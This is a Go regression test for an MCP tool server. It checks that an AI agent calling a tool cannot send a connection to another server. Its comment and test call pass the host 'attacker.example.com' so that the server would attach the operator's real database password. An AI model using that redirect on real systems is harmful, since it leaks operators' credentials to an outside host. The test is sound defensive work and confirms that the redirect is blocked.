package mcp

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	sdk "github.com/modelcontextprotocol/go-sdk/mcp"

	"github.com/this-is-tobi/rule-them-all/internal/registry"
	"github.com/this-is-tobi/rule-them-all/pkg/plugin"
	"github.com/this-is-tobi/rule-them-all/pkg/view"
)

// A regression test for a real, live hole a design review found
// (PROJECT.md D94): a service plugin declares the connection it talks to as
// ordinary inputs so config can fill them, and "ordinary" also meant
// published in the MCP tool schema and accepted from a caller. Since
// plugin.Resolve applies caller values last — above config, above the host's
// own environment — an agent could name any server it liked and the host
// would fill the operator's credential in beside it. Proven end to end
// before the fix: the handler received host="attacker.example.com" together
// with the real $RTA_<NS>_PASSWORD.
//
// The guard is Local, which already means "an input a remote caller may
// never supply" — so this test is written against the *mechanism* rather
// than against pg's or s3's declarations, and it holds for every plugin
// including ones that do not exist yet.
func TestAnAgentCannotChooseWhereACallGoes(t *testing.T) {
	var sawHost, sawPassword string

	// Shaped exactly like plugins/pg's real connFields: a connection input
	// that is Config-backed and Local, plus a Local+EnvFallback credential.
	conn := plugin.Capability{
		ID: "svc.table.list", Summary: "list tables", Safety: plugin.Read,
		Inputs: []plugin.Field{
			{Name: "host", Type: plugin.String, Default: "localhost", Config: "host",
				Local: true, Help: "database host"},
			{Name: "password", Type: plugin.Secret, Local: true, EnvFallback: true, Help: "password"},
			{Name: "table", Type: plugin.String, Help: "table to describe"},
		},
		Run: func(_ context.Context, req plugin.Request) (view.View, error) {
			sawHost, sawPassword = req.String("host"), req.String("password")
			return view.Text{Body: "ok"}, nil
		},
	}

	reg := registry.New()
	if err := reg.Register(plugin.Plugin{
		Name: "svc", Summary: "svc", Capabilities: []plugin.Capability{conn},
	}); err != nil {
		t.Fatal(err)
	}

	// The operator's credential, exactly as `rta mcp serve` inherits it.
	t.Setenv(plugin.LocalEnvVar("svc.table.list", "password"), "operator-production-password")
	t.Setenv("RTA_DATA_DIR", t.TempDir())

	server := NewServer(reg, "test", Options{})
	st, ct := sdk.NewInMemoryTransports()
	ctx := context.Background()
	if _, err := server.Connect(ctx, st, nil); err != nil {
		t.Fatal(err)
	}
	client := sdk.NewClient(&sdk.Implementation{Name: "agent", Version: "0"}, nil)
	session, err := client.Connect(ctx, ct, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer session.Close()

	// The connection input must not be advertised to the model at all: an
	// input a model can see is one it will try to fill.
	tools, err := session.ListTools(ctx, &sdk.ListToolsParams{})
	if err != nil {
		t.Fatal(err)
	}
	var schema string
	for _, tool := range tools.Tools {
		if tool.Name == "svc_table_list" {
			raw, err := json.Marshal(tool.InputSchema)
			if err != nil {
				t.Fatal(err)
			}
			schema = string(raw)
		}
	}
	if schema == "" {
		t.Fatal("svc_table_list was not exposed at all")
	}
	if strings.Contains(schema, `"host"`) {
		t.Errorf("the MCP tool schema advertises the connection input:\n%s", schema)
	}
	if strings.Contains(schema, `"password"`) {
		t.Errorf("the MCP tool schema advertises the credential:\n%s", schema)
	}
	// The payload input is still offered — this must narrow what an agent may
	// choose, not what it may do.
	if !strings.Contains(schema, `"table"`) {
		t.Errorf("an ordinary input stopped being offered:\n%s", schema)
	}

	// And sending it anyway must not work, since a declared name passes
	// validateGivenArgs whether or not the schema advertised it.
	res, err := session.CallTool(ctx, &sdk.CallToolParams{
		Name:      "svc_table_list",
		Arguments: map[string]any{"host": "attacker.example.com", "table": "users"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if res.IsError {
		t.Fatalf("the call failed for an unrelated reason: %+v", res.Content)
	}
	if sawHost == "attacker.example.com" {
		t.Errorf("an agent redirected the call to %q — and the host supplied the credential %q with it",
			sawHost, sawPassword)
	}
	if sawHost != "localhost" {
		t.Errorf("host = %q, want the configured default localhost", sawHost)
	}
	// The credential must still arrive: this closes a redirect, it does not
	// break the plugin's ability to authenticate where it is supposed to.
	if sawPassword != "operator-production-password" {
		t.Errorf("password = %q, want the host's own environment to have supplied it", sawPassword)
	}
}
